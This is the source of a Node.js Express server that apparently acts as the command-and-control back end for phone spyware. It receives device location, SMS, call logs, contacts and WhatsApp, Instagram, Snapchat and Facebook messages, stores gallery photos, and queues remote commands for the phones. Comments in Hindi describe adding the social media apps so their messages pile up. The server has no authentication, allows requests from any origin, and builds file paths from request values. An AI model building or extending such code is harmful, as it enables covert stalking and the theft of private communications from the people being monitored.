const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// --- 1. SETUP & STORAGE ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

let devicesStatus = {}; 

// --- 2. ADMIN DASHBOARD ROUTES ---
app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    if (!device) return res.json({ id: id, isOnline: false });
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline: isOnline });
});

// --- 3. PHONE CONNECTION (PING) ---
app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        const pendingCommand = (devicesStatus[id] && devicesStatus[id].command) ? devicesStatus[id].command : "none";

        let finalBattery = battery || level || 0;
        let isCharging = (String(charging) === "true");
        let currentLat = lat || (devicesStatus[id] ? devicesStatus[id].lat : 0);
        let currentLon = lon || (devicesStatus[id] ? devicesStatus[id].lon : 0);

        devicesStatus[id] = {
            id: id,
            model: model || (devicesStatus[id] ? devicesStatus[id].model : "Unknown"),
            battery: finalBattery,
            version: version || "--",
            charging: isCharging,
            lat: currentLat,
            lon: currentLon,
            lastSeen: Date.now(),
            command: "none"
        };

        console.log(`📡 [PING] ${id} | Bat: ${finalBattery}%`);
        res.json({ status: "success", command: pendingCommand });
    } catch (e) {
        console.error("Ping Error:", e);
        res.status(500).json({ error: "Server Error" });
    }
});

// --- 4. COMMAND SENDING ---
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
    const id = device_id.toUpperCase().trim();
    if (!devicesStatus[id]) devicesStatus[id] = { id: id };
    
    let finalCommand = command === "normal" ? "loud" : command;
    devicesStatus[id].command = finalCommand;
    console.log(`🚀 [COMMAND] Sending '${finalCommand}' to ${id}`);
    res.json({ status: "success", command: finalCommand });
});

// --- 5. DATA UPLOAD (UPDATED FOR SOCIAL MEDIA) ---
app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;

        // LOCATION FIX
        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            if (locObj && (locObj.lat || locObj.latitude)) {
                if (!devicesStatus[id]) devicesStatus[id] = { id: id };
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
            }
            fs.writeFileSync(filePath, JSON.stringify(locObj, null, 2));
        }
        
        // --- CHAT LOGS & SOCIAL MEDIA FIX ---
        // Maine yahan 'whatsapp', 'instagram', 'snapchat', 'facebook' add kar diya hai
        // Taaki inka data LIST bankar save ho, delete na ho.
        else if ([
            'notifications', 'sms', 'call_logs', 'contacts', 'chat_logs', 
            'whatsapp', 'instagram', 'snapchat', 'facebook', 'social_media'
        ].includes(type)) {
            
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
            }
            // Naya data array ke shuru me jodo (Latest First)
            const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            const finalData = [...newDataArray, ...existingData].slice(0, 2000); // Save last 2000 msgs
            
            fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
            console.log(`✅ [DATA] ${type} saved for ${id}`);
        } 
        else {
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }

        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ Upload Error (${type}):`, error.message);
        res.status(500).json({ status: "error" });
    }
});

// --- 6. GALLERY & GET ---
app.post('/api/upload_gallery', (req, res) => {
    let { device_id, image_data, date } = req.body;
    if (!device_id || !image_data) return res.status(400).json({ error: "Missing Data" });
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_gallery.json`);
    try {
        let galleryData = [];
        if (fs.existsSync(filePath)) { try { galleryData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {} }
        galleryData.unshift({ time: date || new Date().toLocaleString(), uploadedAt: Date.now(), image: image_data });
        fs.writeFileSync(filePath, JSON.stringify(galleryData.slice(0, 50), null, 2));
        res.json({ status: "success" });
    } catch (error) { res.status(500).json({ error: "Failed" }); }
});

app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]);
});

app.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`));
